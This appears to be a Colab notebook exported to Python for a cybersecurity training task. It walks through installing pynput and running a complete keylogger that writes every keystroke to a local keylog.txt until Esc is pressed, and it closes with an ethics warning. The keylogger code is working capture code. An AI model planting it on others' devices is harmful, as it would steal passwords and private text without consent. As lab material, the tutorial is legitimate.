# -*- coding: utf-8 -*-
"""SCT_CS_4.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/1ZIorfsWPdDa-E3-pkjjS-T9HpG4NOaRT

Install the pynput library:
Open your terminal or command prompt and run:
"""

pip install pynput

"""Create a Python Script:
Create a new Python file, for example, keylogger.py, and paste the following code into it:
"""

from pynput import keyboard

# Path to the log file
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., space, enter, etc.)
        if key == keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        elif key == keyboard.Key.tab:
            with open(log_file, "a") as f:
                f.write("\t")
        else:
            with open(log_file, "a") as f:
                f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening to the keyboard
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

"""Run the Script:
Open a terminal or command prompt in the directory where your script is saved and run the script with:
"""

python keylogger.py

"""The script will start capturing keystrokes and saving them to keylog.txt in the same directory as the script. The keylogger will stop when you press the esc key.

Notes:
Running as Administrator:
On some operating systems, you might need to run your script as an administrator for it to capture keystrokes properly.

Ethical Considerations:
Only use this script on your own devices or with explicit permission. Unauthorized keylogging is illegal and unethical.

Testing and Stopping the Keylogger:
To stop the keylogger, press the esc key. Check the keylog.txt file to see the captured keystrokes.
"""